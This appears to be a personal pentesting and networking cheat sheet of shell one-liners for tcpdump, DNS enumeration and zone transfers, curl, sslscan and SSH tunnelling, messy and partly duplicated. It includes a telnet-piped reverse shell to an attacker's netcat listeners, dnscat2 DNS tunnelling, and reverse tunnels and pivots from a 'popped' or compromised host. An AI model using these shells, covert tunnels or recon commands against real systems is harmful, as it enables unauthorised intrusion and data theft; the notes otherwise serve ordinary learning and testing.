# Traffic Capture







capinfos test.pcap




## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 tcp
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 port 22
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 src 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 dst 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'tcp port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -w out.pcap -s 65535 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##



## ------------------------------------------------------------------------------------------------ ##
	tcpdump -r $Capture.pcap                             ## Read the file
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n src host 192.168.2.10 -r $Capture.pca     ## Filter By Source
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n dst host 192.168.2.12 -r $Capture.pca     ## Filter By Destination
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n port 443 -r $Capture.pca                  ## Filter By Port
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -nX -r $Capture.pca                          ## Read the file and dump in hex format
## ------------------------------------------------------------------------------------------------ ##



##-=================-##
##  [+] TCPDump
##-=================-##


##-=================-##
##  [+] Dump all
##-=================-##
tcpdump
	
	
##-=======================================-##
##  [+] Dump 5 Packets

tcpdump -c 5
	
	
##-============================-##
##  [+] Dump in ASCii format
##-============================-##
tcpdump -A
	
	
##-=======================================-##
##  [+] Dump in hexadecimal format
##-=======================================-##
tcpdump -xx
	
	
##-=======================================-##
##  [+] Dump from an specific interface
##-=======================================-##
tcpdump -i $IFACE
	
	
##-=======================================-##
##  [+] Dump from a specific port
##-=======================================-##
tcpdump port $PORT
	
	

	

	
## ---------------------------------------------------- ##
##   [?] -i $IFACE   ## Listen on all interfaces
##   [?] -c 5        ## Dump 5 packets
##   [?] -xx         ## Use hexadecimal
##   [?] -i $IFACE   ## Using $IFACE interface 
##   [?] port $PORT  ## Using $PORT port 
## ---------------------------------------------------- ##
tcpdump -c 5 -xx -i $IFACE port $PORT



##-====================================================-##
##  [+] Capture ICMP-Echo Packets:
##-====================================================-##
## ---------------------------------------------------- ##
##   [?] -n       ## Don't resolve names
##   [?] -i any   ## listen on all intrfaces
## ---------------------------------------------------- ##
##   [?] icmp[icmptype]=icmp-echo
##        > Capture/display only icmp eho requests
## ---------------------------------------------------- ##
tcpdump -ni any icmp[icmptype]=icmp-echo
	





##-=================================================================================-##
##  [+] Dump network traffic with tcpdump to file with time-stamp in its filename
##-=================================================================================-##
date +"%Y-%m-%d_%H-%M-%Z" | xargs -I {} bash -c "sudo tcpdump -nq -s 0 -i eth0 -w ./dump-{}.pcap"








tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21


Have you got a shell? Can you interact with the system?
# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)


telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!



ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]

ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port


Is tunnelling possible? Send commands locally, remotely
ssh -D 127.0.0.1:9050 -N [username]@[ip] 





host -t <type> $Domain.com					## DNS Enumeration
     mx = mail server
     ns = name server

host -l $Domain.com <DNS server>			## DNS Zone transfer




traceroute 8.8.8.8
tracepath 8.8.8.8
dig 8.8.8.8
whois 8.8.8.8



nmap 8.8.8.8
jobs
jobs -l


##-=========================================================-##
##  [+] Set audible alarm when an IP address comes online
##-=========================================================-##
ping -i 60 -a IP_address




## ----------------------------------------------------------------------------------------- ##
	host -t ns $Domain.com                    # Show name servers 
## ----------------------------------------------------------------------------------------- ##
	host -t mx $Domain.com                    # Show mail servers
## ----------------------------------------------------------------------------------------- ##
	host $Domain.com
## ----------------------------------------------------------------------------------------- ##
	host -l $Domain.com $NameServer          # Zone transfer
## ----------------------------------------------------------------------------------------- ##



##-===============================================================-##
##  [+] Use a bash loop to find the IP address behind each host
##-===============================================================-##
for url in $(cat list.txt); do host $url; done

##-=========================================================================-##
##  [+] Collect all the IP Addresses from a log file and sort by frequency
##-=========================================================================-##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn



## ----------------------------------------------------------------------------------------- ##
	dig +short +identify $Server				## see what name server 
												## or whose cache is providing answers
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com | grep status				## receive the NXDOMAIN status.
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com | grep Query				## query time only
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com $Type                    	## a, mx, ns, soa, srv, txt, any
## ----------------------------------------------------------------------------------------- ##
	dig -x $TargetIP							## Pointer records
## ----------------------------------------------------------------------------------------- ##
	dig @NameServerIP $Domain.com axfr			## Zone transfer
## ----------------------------------------------------------------------------------------- ##
	dig @NameServerIP $Domain.com afro			## Forward zone transfer
## ----------------------------------------------------------------------------------------- ##
	dig @$IPAddr $Domain +norecurse				## Non recursive query (cache lookup)
## ----------------------------------------------------------------------------------------- ##
	dig MX +short $Domain						## Perform MX Record Lookup
## ----------------------------------------------------------------------------------------- ##
	dig ns $Domain								## List the Name Servers for google.com
## ----------------------------------------------------------------------------------------- ##
	dig a $Domain.com @nameserver				## Perform DNS IP Lookup
## ----------------------------------------------------------------------------------------- ##



##-============================================-##
##  [+] Query Wikipedia via console over DNS
##-============================================-##
dig +short txt <keyword>.wp.dg.cx


##-=============================-##
##  [+] Dig Debug DNS Tracing
##-=============================-##
dig +trace $Domain


##-==================================================-##
##  [+] Extract your external IP address using dig
##-==================================================-##
dig +short myip.opendns.com @resolver1.opendns.com


##-==================================================-##
##  [+] Reverse domain name resolution (PTR record)
##-==================================================-##
dig -x 220.181.14.155 +noall +answer




dig $Domain +nssearch



dig $Domain +nssearch | cut -d' ' -f4,11  



dig +onesoa +nocomments +nocmd +nostats AXFR 


dig +onesoa +nocomments +nocmd +nostats AXFR  @161.97.219.84



dig_tld () {
  /usr/bin/dig +onesoa +nocomments +nocmd +nostats AXFR $1 @$2 > output/$1.zone
  sed "/NSEC\|RRSIG\|DNSKEY\|SOA\|^$1\./d" < output/$1.zone > output/include/$1.zone
}

/usr/bin/dig +onesoa +nocomments +nocmd +nostats AXFR \. @161.97.219.84 > output/root.zone
sed "/NSEC\|RRSIG\|DNSKEY\|SOA\|^\./d" < output/root.zone > output/include/root.zone


dig +onesoa +nocomments +nocmd +nostats AXFR $1 @$2







Query DNS bind version information Most DNS servers use BIND to query the version information of bind, 
 not all DNS servers can query BIND information, 
 most dns servers The protection mode is set
 and cannot be queried in this way.


dig +noall +answer $Domain ns


dig +noall +answer txt chaos VERSION.BIND ns3.sina.com.cn.




# getting the bind version.
$ sudo sudo dig +short @particula.local version.bind txt chaos
	"9.10.3-P4-Debian"

	
	
## add this option to obfuscate the bind version:

 /etc/bind/named.conf.options
 
 
 
options {
	version none;
};




/etc/systemd/resolved.conf

DNS=

resolvectl status
resolvectl query 




## ----------------------------------------------------------------------------------------- ##
	nslookup $Domain.com					## Query A and PTR Records
## ----------------------------------------------------------------------------------------- ##
	nslookup $Domain.com x.x.x.x			## Query A and PTR record 
											## using a different name server
## ----------------------------------------------------------------------------------------- ##
	nslookup -debug google.com				## Debug Mode for nslookup
## ----------------------------------------------------------------------------------------- ##
	nslookup -query=ns $Domain.com			## Query Nameserver records
## ----------------------------------------------------------------------------------------- ##
	nslookup -querytype=mx $Domain.com		## Query MX record
## ----------------------------------------------------------------------------------------- ##
	nslookup set type=mx $Domain.com		## Interactive option
## ----------------------------------------------------------------------------------------- ##
	nslookup -norecursive $Domain.com		## Non Recursive lookup
## ----------------------------------------------------------------------------------------- ##
	nslookup recursive $Domain.com			## Recursive lookup
## ----------------------------------------------------------------------------------------- ##
	nslookup ns4.google.com					## Resolve the IP Address for ns4.google.com
## ----------------------------------------------------------------------------------------- ##


## ----------------------------------------------------------------------------------------- ##
	nslookup server $Server set type=any ls -d $Target		## DNS zone transfer
## ----------------------------------------------------------------------------------------- ##



##-==========================-##
##  [+] DNS zone transfer
##-==========================-##

nslookup server $Server set type=any ls -d $Target		## DNS zone transfer


##-==================================================-##
##  [+] return verbose information about a record
##-==================================================-##
set debug




dig $Domain.com +nssearch



dig $Domain.com +nssearch | cut -d' ' -f4,11  





DNS lookups
Zone Transfers


whois $Domain.com
dig {a|txt|ns|mx} $Domain.com
dig {a|txt|ns|mx} $Domain.com @ns1.domain.com


host -t {a|txt|ns|mx} $Domain.com
host -a $Domain.com
host -l $Domain.com ns1.$Domain.com


host -T -l $Domain ns4.$Domain


any
host -t SOA 0.168.192.in-addr.arpa
axfr
cname 



dnsrecon -d $Domain.com -t axfr @ns2.$Domain.com


dnsenum $Domain.com


dnsrecon -d $Domain --lifetime 10 -t brt -D usr/share/dnsrecon/namelist.txt -x sina.xml



##-==================================================-##
##  [+] Dnsrecon DNS Brute Force

dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml



dnsenum -f /usr/share/dnsenum/dns.txt -dnsserver 8.8.8.8 $Domain -o $Domain.xml



##-======================================-##
##  [+] Dnsrecon DNS List of $Domain
##-======================================-##
dnsrecon -d $Domain -t axfr



##-=================-##
##  [+] DNSEnum
##-=================-##
dnsenum $Domain






##-==========================-##
##  [+] Harvester - Flags
##-==========================-##
theharvester -d $Domain -l $Limit -b $DataSource


##-===================================================-##
##  [+] Harvester Data Source - All Search Engines
##-===================================================-##
theharvester -d url -l 500 -b all -b all = all search engines


##-=======================================-##
##  [+] Harvester Data Source - Google
##-=======================================-##
theharvester -d $Domain -l 500 -b google
theharvester -d $Domain -b google > google.txt


##-=======================================-##
##  [+] Harvester Data Source - Twitter
##-=======================================-##
theharvester -d $Domain -l 500 -b twitter


##-======================================================-##
##  [+] Use SHODAN database to query discovered hosts
##-======================================================-##
theharvester -d $Domain -h > $Domain-SHODAN-Query.txt




##-================-##
##  [+] DNSMap
##-================-##
dnsmap  -w wordlist.txt sina.com







DNS Enumeration

NMAP DNS Hostnames Lookup nmap -F --dns-server <dns server ip> <target ip range>

Host Lookup
host -t ns megacorpone.com

Reverse Lookup Brute Force - find domains in the same range
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"

Perform DNS IP Lookup
dig a domain-name-here.com @nameserver

Perform MX Record Lookup
dig mx domain-name-here.com @nameserver

Perform Zone Transfer with DIG
dig axfr domain-name-here.com @nameserver

DNS Zone Transfers
Windows DNS zone transfer

nslookup -> set type=any -> ls -d blah.com

Linux DNS zone transfer

dig axfr blah.com @ns1.blah.com

Dnsrecon DNS Brute Force
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml

Dnsrecon DNS List of megacorp
dnsrecon -d megacorpone.com -t axfr

DNSEnum
dnsenum zonetransfer.me





DNS Tunneling

ruby ./dnscat2.rb dnscat2> New session established: 1422 dnscat2> session -i 1422


Target Machine:
dnscat --host <dnscat server ip>




 Start the dnscat2 Server
sudo ruby ./dnscat2.rb --security=authenticated --secret=12viFdfMonso3dF
pentestdomain.com



Start the dnscat2 Client
./dnscat --retransmit-forever --secret=12viFdfMonso3dF pentestdomain.com







SSH Local Port Forwarding: supports bi-directional communication channels

ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
SSH Remote Port Forwarding: Suitable for popping a remote shell on an internal non routable network

ssh <gateway> -R <remote port to bind>:<local host>:<local port>
SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT

ssh -D <local proxy port> -p <remote port> <target>
Proxychains - Perform nmap scan within a DMZ from an external computer

Create reverse SSH tunnel from Popped machine on :2222

ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com ssh -f -N -R 2222:<local host>:22 root@<remote host>

Create a Dynamic application-level port forward on 8080 thru 2222

ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>

Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains

proxychains nmap --top-ports=20 -sT -Pn $ip/24





nslookup -> set type=any -> ls -d $Domain.com
for sub in $(cat subdomains.txt);do host $sub.$Domain.com|grep "has.address";done



##-==============-##
##  [+] MTR
##-==============-##
mtr google.com



## ------------------------------------------------------------------------------- ##
	dig @127.0.0.1 NS $Domain.com				## To test the local server 
	dig @204.97.212.10 NS MX $Domain.com		## Query an external server 
	dig AXFR @ns1.$Domain.org @$Domain.com		## Get the full zone (zone transfer) 
	dig @137.65.10.1 mail.$Domain.com –t MX
## ------------------------------------------------------------------------------- ##
	host -t MX $Domain.com			## Get the mail MX entry 
	host -t NS -T $Domain.com		## Get the NS record over a TCP connection 
	host -a $Domain.com				## Get everything 
## ------------------------------------------------------------------------------- ##



##-=======================-##
##  [+] Reverse queries
##-=======================-##


## --------------------------- ##
	dig -x 78.31.70.238
	host 78.31.70.238
	nslookup 78.31.70.238
## --------------------------- ##



nslookup -q=TXT _cloud-netblocks.googleusercontent.com  8.8.8.8


dig txt _cloud-netblocks.googleusercontent.com +short | tr " " "\n" | grep include | cut -f 2 -d :

dig txt $LINE +short





dig soa github.com


nslookup -querytype=SOA 
nslookup -querytype=mx
nslookup set type=mx
nslookup set type=SRV 
nslookup recursive 
nslookup -norecursive 
nslookup -q=TXT _cloud-netblocks.googleusercontent.com  8.8.8.8


dig -axfr @<DNS 

host -t ns 






dig @8.8.8.8 $Domain						## Resolve an IP using DIG

dig @8.8.8.8 $Domain -t mx					## Find Mail servers for a domain

dig @8.8.8.8 $Domain -t any					## Find any DNS records for a domain


##-=====================-##
##  [+] Zone Transfer
##-=====================-##
dig @192.168.100.2 $Domain -t axfr
host -l $Domain 192.168.100.2
nslookup / ls -d $Domain.local




##-===============================-##
##  [+] Resolve an IP using DIG
##-===============================-##
dig @8.8.8.8 $Domain

##-======================================-##
##  [+] Find Mail servers for a domain
##-======================================-##
dig @8.8.8.8 $Domain -t mx


##-=========================================-##
##  [+] Find any DNS records for a domain
##-=========================================-##
dig @8.8.8.8 $Domain -t any









##-========================-##
##  [+] WHOIS Querying
##-========================-##
whois $Domain


##-==============================-##
##  [+] Resolve an IP using DIG
##-==============================-##
dig @8.8.8.8 $Domain


##-======================================-##
##  [+] Find Mail servers for a domain
##-======================================-##
dig @8.8.8.8 $Domain -t mx

##-======================================-##
##  [+] Find any DNS records for a domain
##-======================================-##
dig @8.8.8.8 $Domain -t any


##-======================-##
##  [+] Zone Transfer
##-======================-##
dig @192.168.100.2 $Domain -t axfr
host -l $Domain 192.168.100.2
nslookup / ls -d domain.com.local



##-=========================-##
##  [+] Fierce
##-=========================-##
fierce -dns $Domain -file $OutputFile
fierce -dns $Domain -dnsserver $Server
fierce -range $IPRange -dnsserver $Server
fierce -dns $Domain -wordlist $Wordlist


fierce -dnsserver 8.8.8.8 -dns $Domain -wordlist /usr/share/fierce/hosts.txt



##-=========================-##
##  [+] DNSDict6
##-=========================-##

## --------------------------------------------- ##
##  [?] Enumerates a domain for DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain









dnssec-keygen -a HMAC-SHA512 -b 512 -n HOST -r /dev/urandom tsigkey



/etc/bind/named.conf.tsigkeys

key "master-slave" {
 algorithm HMAC-SHA512;
 secret "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx==";
};



69.5.134.33

dig @<master_ipaddr> xxxxxx.xxx axfr
dig @<master_ipaddr> xxxxxx.xxx axfr -k /etc/bind/named.conf.tsigkeys








dnscrypt-wrapper --gen-provider-keypair | egrep '^Public key fingerprint' | awk '{print $4}' > /etc/dnscrypt-wrapper/fingerprint
dnscrypt-wrapper --gen-crypt-keypair
dnscrypt-wrapper --crypt-secretkey-file crypt_secret.key --provider-publickey-file=public.key --provider-secretkey-file=secret.key --gen-cert-file











LUKS encrypted device or the output of
cryptsetup luksHeaderBackup <device> --header-backup-file <file>
   
   





curl -XGET 'http://localhost:4444'

https://127.0.0.1:9392
https://127.0.0.1:9392/login/login.html

-p socks5://127.0.0.1:1080


curl -x socks5://user2:secret2@localhost:1080 https://web.telegram.org

curl https://api.telegram.org




 echo "==> Fetching ${ISO_CHECKSUM}"
  curl -sS -o ${ISO_DIR}/${ISO_CHECKSUM} https://${MIRROR}${MIRROR_PATH}/${RELEASE}/amd64/${ISO_CHECKSUM}
  curl -sS -o ${ISO_DIR}/${ISO_CHECKSUM}.sig https://${MIRROR}${MIRROR_PATH}/${RELEASE}/amd64/${ISO_CHECKSUM}.sig














-{{.v27.8.4.}}-[[.01-12-2020.]].txt


-{{.v**.*.*.}}-[[.01-**-2020.]]
-{{.v**.*.*.}}-[[.01-**-2020.]].txt
-{{.v**.*.*.}}-[[.01-**-2020.]].sh
-{{.v**.*.*.}}-[[.01-**-2020.]].md







Alt+l

##-=========================-##
##  [+] Grab HTTP Headers
##-=========================-##
curl -LIN $Domain



##-=====================-##
##  [+] Redirections: 
##-=====================-##
## ----------------------------------------------------------- ##
##  [?] Examine the response of a 301 message or Javascript.
## ----------------------------------------------------------- ##
curl -vvvv $Domain



##-======================================-##
##  [+] Curl SOCKS5 Proxy Connection:
##-======================================-##
curl -s -m 10 --socks5 $hostport --socks5-hostname $hostport -L $URL



##-===================================================================-##
##  [+] Curl SOCKS5 Proxy Connection - Using Win Firefox UserAgent:
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL



##-==========================================-##
##  [+] Curl - Windows Firefox UserAgent:
##-==========================================-##
wget -U "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" $URL



## --------------------------------------------------------- ##
##   [?] if you ever forget the dns4tor*.onion address, 
##       --> you can simply use cURL:
## --------------------------------------------------------- ##
curl -sI https://tor.cloudflare-dns.com | grep alt-svc




##-=======================================================-##
##  [+] Print the Response Headers and Body (together)
##-=======================================================-##
curl -i $Domain



##-=========================================-##
##  [+] Print Only the Response Headers
##-=========================================-##
curl -s -o /dev/null -D - $Domain



##-========================================-##
##  [+] Detailed Trace with Timestamps
##-========================================-##
curl --trace --trace-time $Domain



##-======================================-##
##  [+] Print Only the Response Code
##-======================================-##
curl -w '%{response_code}' -s -o /dev/null $Domain



##-==========================================-##
##  [+] Print Only the Response Headers
##-==========================================-##
curl -s -o /dev/null -D - $Domain



##-==========================================-##
##  [+] Change the User Agent to Firefox
##-==========================================-##
curl -A 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0' $Domain



##-==========================================-##
##  [+] Change the User Agent to Chrome
##-==========================================-##
curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' $Domain



##-====================================-##
##  [+] Pretend to be a Google Bot
##-====================================-##
curl -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' $Domain



##-===============================-##
##  [+] Remove the User Agent
##-===============================-##
curl -A '' $Domain


##-==================================-##
##  [+] Send an Empty User Agent
##-==================================-##
curl -A '' -H 'User-Agent;' $Domain



##-===============================-##
##  [+] Save Cookies to a File
##-===============================-##
curl -c cookies.txt $Domain



##-=================================-##
##  [+] Load Cookies from a File
##-=================================-##
curl -b cookies.txt $Domain



##-==========================================-##
##  [+] Send a Referer via the -H argument
##-==========================================-##
curl -H 'Referer: https://digg.com' $Domain



##-=======================-##
##  [+] Add a Referrer
##-=======================-##
curl -e 'https://google.com?q=cats' $Domain



##-================================================-##
##      [+] Bulk Download Files By Their URLs 
##-================================================-##
## ------------------------------------------------ ##
##  [?] The URL Links Are Fed To Curl From xarg
## ------------------------------------------------ ##
xargs -n 1 curl -O < $URLFile



##-=================================-##
##  [+] Basic HTTP Auth:
##-=================================-## 
curl -u $Username:$Password $URL



##-=================================-##
##  [+] Basic HTTP Auth w/Data:
##-=================================-## 
curl $URL -u $Username:$Password -d $Data



##-=================================-##
##  [+] Download from FTP server:
##-=================================-## 
curl -u $FTPUser:$FTPPass -O ftp://$Host/$Path/$File



##-=================================-##
##  [+] Download by proxy server:
##-=================================-## 
curl -x $ProxyURL:$Port $URL



##-=======================-##
##  [+] Ignore SSL Cert:
##-=======================-##  
curl -k $URL



##-============================-##
##  [+] Advanced Operations
##-============================-##


##-=================-## 
##  [+] JSON POST:
##-=================-## 
curl -X POST -H "Content-Type: application/json" -H "Authorization: $type $key" -d '{"key1":"value1","key2":"value2","key3":literal3,"list4":$"listval1","listval2","listval3"}' $URL



##-============================================================-##
##   [+] Use ranges to download or list according to a range:
##-============================================================-##
## ------------------------------------------------------------------------ ##
##  [?] the [a-z] is literal and will look for files named a to z.
## ------------------------------------------------------------------------ ##
curl ftp://$URL/$Path/[a-z]/




##-================================================-##
##  [+] Copy Files Locally:
##-================================================-## 
curl -o $Destination FILE://$Source

curl -o targetfile.txt FILE://mnt/somewhere/targetfile.txt


##-================================================-##
##  [+] List FTP server contents:
##-================================================-## 
curl -u $FTPUser:$FTPPass -O ftp://$host/$Path/


##-================================================-##
##  [+] Upload a file to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T $Filename ftp://$URL


##-================================================-##
##  [+] Upload multiple files to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T "{$File1,$File2}" ftp://$URL


##-================================================-##
##  [+] Upload a file from STDIN to an FTP server:
##-================================================-## 
curl -u $FTPUser:$FTPPass -T - ftp://$URL/$Path/$Filename




##-==================================================-##
##  [+] OpenSSL - Connect To Domain, Show SSL Info
##-==================================================-##
openssl s_client -connect $Domain:443

openssl s_client -connect [host]:[port]



'
##-============================================-##
##  [+] Renegotiating (NULL-SHA or NULL-MD5)
##-============================================-##
sslscan --no-failed --targets=443.txt






##-============================================-##
##  [+] 
##-============================================-##
curl -I linuxacademy.com









telnet <target IP> 443
GET / HTTP/1.0
R
------------------------------------------------------------------------------------------------------

cat 443.txt | while read IP port; do echo "----START "$IP":"$port"----"; echo -e "HEAD / HTTP/1.0\nR\n\n" | ncat --ssl "$IP" "$port"; echo -e "\$







subject=$(grep 'Subject:' tmp_$line)
issuer=$(grep 'Issuer: ' tmp_$line)
$(grep -i 'MD5WithRSAEncryption')





sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $line > tmp_$line






IPv6 address: 128-bit long, 
represented divided in eight 16-bit groups (4 hex digits).




        ## Neighbour Discovery Protocol (NDP)
        ## ==================================
        ## XXX we should probably try to find a way to disable all the NDP
        ##     crap, once connected to a suitable router, but so far it seems
        ##     most commercial/home routers are too crappy to understand SEND:

        ## ICMPv6 type 134 := Router Advertisement (NDP)
        ## ---------------------------------------------
        ## Routers advertise their presence together with various link and
        ## Internet parameters either periodically, or in response to a Router
        ## Solicitation message.
        ##
        ## ICMPv6 type 135 := Neighbor Solicitation (NDP)
        ## ----------------------------------------------
        ## Used by nodes to determine the Link Layer address of a neighbor, or
        ## to verify that a neighbor is still reachable via a cached Link
        ## Layer address.
        ##
        ## ICMPv6 type 136 := Neighbor Advertisement (NDP)
        ## -----------------------------------------------
        ## Used by nodes to respond to a Neighbor Solicitation message
        ##
        ## ICMPv6 type 138 := Router Renumbering
        ## ---------------------------------------------------------------------
        
        
        
	
	
	
	
	
	
	

/etc/network/interfaces					## Network interfaces
/var/lib/dhcp/dhclient.leases			## The lease with the full information
/var/lib/dhcpcd/dhcpcd-eth0.info



grep 'X509v3 Subject Alternative Name:' tmp | sed 's/      X509v3 Subject Alternative Name:   //g' | sed 's/, DNS:/\n/g' | sed 's/www.//g' | sed 's/DNS://g' > tmp2





##-============================================-##
##  [+] Fierce
##-============================================-##
fierce -dns <domain> -file <output_file>
fierce -dns <domain> -dnsserver <server>
fierce -range <ip-range> -dnsserver <server>
fierce -dns <domain> -wordlist <wordlist>








##-============================-##
##  [+] Create an ssh tunnel
##-============================-##


ssh -f -L 9000:targetservername:8088 root@192.168.14.72 -N






Port Forwarding / SSH Tunneling
SSH: Local Port Forwarding

# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER

SSH: Dynamic Port Forwarding

# Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER
# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;
ssh -D 127.0.0.1:8080 user@SSH_SERVER

SSH: Remote Port Forwarding

# Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389
# Scenario: expose RDP on non-routable network;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP

Proxy Tunnel

# Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128
# Scenario: a remote host has SSH running, but it's only bound to 127.0.0.1, but you want to reach it;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555

HTTP Tunnel: SSH Over HTTP

# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80

# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80
htc -F 8080 192.168.1.15:80

# Client - connect to localhost:8080 -> get tunneled to 192.168.1.15:80 -> get redirected to 192.168.1.15:22
ssh localhost -p 8080





##-======================-##
##  [+] SSH Tunneling
##-======================-##

# Local Tunnel
ssh $ATTACKER -L 3000:$TARGET:2222

# Remote Tunnel
ssh $TARGET -R 2222:localhost:3000

# Dynamic Tunnel to $TARGET
ssh -D 127.0.0.1:3000 -N username@$TARGET




ssh root@targetIP                         Connect as root on a standard port
ssh targetIP                              Connect with no user name on a standard port
ssh root@targetIP -p 2222                 Connect as root on a non-standard port
ssh root@targetIP -i key                  Connect as root and authenticate using an identity file

- Local port forward
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
ssh user@targetIP -L 5900:localhost:5900

- Remote port forwarding
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
ssh user@targetIP -R 2222:localhost:22 -f -N
                                          -f   Force to background
                                          -N   Do not execute a remote command

- Dynamic port forward
ssh <target> -D <local proxy port>
ssh user@targetIP -C -D 1080              -C   Enable compression, good for web browsing
                                          -D   Create a SOCKS tunnel on the default port


Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
Remove everything for HTTP, SSL, and FTP proxies and ports
SOCKS Host: 127.0.0.1   Port: 1080
Select SOCKS v5 and Remote DNS










SSH Local Port Forwarding: supports bi-directional communication channels

ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
SSH Remote Port Forwarding: Suitable for popping a remote shell on an internal non routable network

ssh <gateway> -R <remote port to bind>:<local host>:<local port>
SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT

ssh -D <local proxy port> -p <remote port> <target>
Proxychains - Perform nmap scan within a DMZ from an external computer

Create reverse SSH tunnel from Popped machine on :2222

ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com ssh -f -N -R 2222:<local host>:22 root@<remote host>

Create a Dynamic application-level port forward on 8080 thru 2222

ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>




SSH Pivoting

SSH pivoting from one network to another:

ssh -D <local host>:1010 -p 22 user@<remote host>






#  Query Wikipedia via console over DNS

dig +short txt <keyword>.wp.dg.cx

http://www.commandlinefu.com/commands/view/2829/query-wikipedia-via-console-over-dns


#  Query Wikipedia via console over DNS
mwiki () { blah=`echo $@ | sed -e 's/ /_/g'`; dig +short txt $blah.wp.dg.cx; }

http://www.commandlinefu.com/commands/view/4591/query-wikipedia-via-console-over-dns


#  Query Wikipedia via console over DNS

mwiki() { dig +short txt "$*".wp.dg.cx; }
http://www.commandlinefu.com/commands/view/5187/query-wikipedia-via-console-over-dns


Copied to Clipboard!
	dig +short txt <keyword>.wp.dg.cx



 Query Wikipedia via console over DNS 
nslookup -q=txt <topic>.wp.dg.cx



 Query Wikipedia via console over DNS 
mwiki () { dig +short txt `echo $*|sed 's| *|_|g'`.wp.dg.cx; }





You can also search for more than one word like this:
dig +short txt "multiple words".wp.dg.cx




Script with prettified output:
cat wikisole.sh
#!/bin/sh COLUMNS=`tput cols` dig +short txt "${1}".wp.dg.cx | sed -e 's/" "//g' -e 's/^"//g' -e 's/"$//g' -e 's/ http:/\n\nhttp:/' | fmt -w $COLUMNS 

 function wiki () { COLUMNS=`tput cols` dig +short txt ${1}.wp.dg.cx | sed -e 's/" "//g' -e 's/^"//g' -e 's/"$//g' -e 's/ http:/\n\nhttp:/' | fmt -w $COLUMNS } 
 
 
  You can also search for more than one word like this: 
 dig +short txt "multiple words".wp.dg.cx
 
